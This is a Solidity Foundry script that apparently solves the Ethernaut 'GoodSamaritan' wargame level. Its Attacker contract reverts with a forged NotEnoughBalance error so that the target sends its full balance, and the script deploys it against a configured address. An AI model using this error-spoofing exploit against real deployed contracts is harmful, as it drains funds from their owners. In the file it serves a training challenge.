// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {GoodSamaritan, Coin} from "../src/GoodSamaritan.sol";

// Define the custom error
error NotEnoughBalance();

contract Attacker {
    GoodSamaritan public goodSamaritan;
    Coin public coin;

    constructor(address _goodSamaritan) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
        coin = goodSamaritan.coin();
    }

    function notify(uint256 amount) external {
        if (amount == 10) revert NotEnoughBalance();
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }
}

contract SolveGoodSamaritan is Script {
    GoodSamaritan public goodSamaritan;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        goodSamaritan = GoodSamaritan(payable(vm.envAddress("GOODSAMARITAN_ADDRESS")));

        Attacker attacker = new Attacker(address(goodSamaritan));
        attacker.attack();

        vm.stopBroadcast();
    }
}
